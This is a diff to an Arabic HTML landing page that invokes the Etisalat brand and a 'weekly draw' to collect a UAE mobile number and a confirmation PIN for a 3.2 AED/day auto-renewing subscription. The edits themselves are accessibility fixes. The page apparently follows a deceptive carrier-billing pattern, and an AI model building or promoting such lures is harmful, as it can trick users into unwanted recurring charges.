@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>العرض الخاص من اتصالات</title>
   <style>
     /* ── 工业级重置：彻底根除手机端多余的晃动、滚动条和白边 ── */
@@ -238,14 +238,14 @@
 
   <div class="scroll-wrapper">
     
-    <div id="landing-view" class="main-hero-screen">
+    <main id="landing-view" class="main-hero-screen">
       <div class="hero-content-inner">
         
         <h1 class="main-title-ar">حصرياً لمشتركي اتصالات الإمارات فقط</h1>
         <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأسبوعية المميزة.</p>
         
         <div class="form-card" id="step-1">
-          <label class="form-lbl">أدخل رقم هاتفك المتحرك:</label>
+          <label class="form-lbl" for="inp-msisdn">أدخل رقم هاتفك المتحرك:</label>
           <div class="phone-input-group">
             <div class="phone-prefix-box">
               <div class="uae-flag">
@@ -264,7 +264,7 @@
         </div>
 
         <div class="form-card" id="step-2" style="display: none;">
-          <label class="form-lbl">أدخل رمز PIN المكون من 4 أرقام:</label>
+          <label class="form-lbl" for="inp-pin">أدخل رمز PIN المكون من 4 أرقام:</label>
           <div class="pin-input-group">
             <input type="text" inputmode="numeric" pattern="[0-9]*" id="inp-pin" placeholder="XXXX" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
           </div>
@@ -272,7 +272,7 @@
         </div>
 
       </div>
-    </div>
+    </main>
     
     <div class="bottom-legal-zone">
       <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت, أرسل STOP إلى 1111.</p>
@@ -304,6 +304,6 @@
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script src="lander.js"></script>
+  <script src="lander.js" defer></script>
 </body>
 </html>
